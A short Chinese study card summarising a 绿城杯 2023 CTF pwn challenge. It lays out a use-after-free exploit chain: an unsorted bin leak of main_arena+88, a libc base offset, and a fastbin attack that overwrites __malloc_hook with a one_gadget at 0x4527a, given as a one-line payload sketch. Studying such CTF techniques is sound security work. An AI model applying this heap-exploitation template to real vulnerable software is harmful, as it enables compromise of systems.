---
title: "漏洞学习之PWN-绿城杯uaf_pwn 分析"
category: pwn
tags: ["绿城杯", "pwn", "UAF", "unsorted bin leak", "main_arena+88", "fastbin attack"]
signals: ["绿城杯 2023", "UAF", "unsorted bin leak", "main_arena+88", "fastbin attack", "__malloc_hook", "one_gadget 0x4527a", "uaf", "UAF_pwn", "unsorted", "bin", "main_arena", "fastbin", "attack"]
difficulty: easy
source: "https://www.ctfiot.com/89346.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 漏洞学习之PWN-绿城杯uaf_pwn 分析

> 赛事：绿城杯 2023 | 方向：pwn | 难度：easy

## 一句话总结

绿城杯UAF_pwn：unsorted bin泄main_arena+88+fastbin attack改__malloc_hook为one_gadget

## 攻击链

1. malloc(0x100)→unsorted bin→main_arena+88 leak→libc_base→malloc_hook=libc.symbols['__malloc_hook']+libc_base→one_gadget=libc+0x4527a→fill chunk1_fd→malloc(0x60)x2→fill 0x13字节padding+one_gadget→malloc触发

## 关键 payload

```
malloc(0x100);free(0);show(0)→leak main_arena+88;libc_base=leak-0x3c4b78;__malloc_hook=libc_base+offset;one_gadget=libc+0x4527a;fill(1, p64(malloc_hook-0x23))
```

## 经验教训

UAF + unsorted bin leak + fastbin fd覆盖到__malloc_hook是经典glibc 2.23 pwn模板

## 标签

UAF、unsorted bin leak、main_arena+88、fastbin attack、__malloc_hook、one_gadget 0x4527a

## 参考来源

- https://www.ctfiot.com/89346.html
- 原文件：漏洞学习之PWN-绿城杯uaf_pwn_分析.full.md
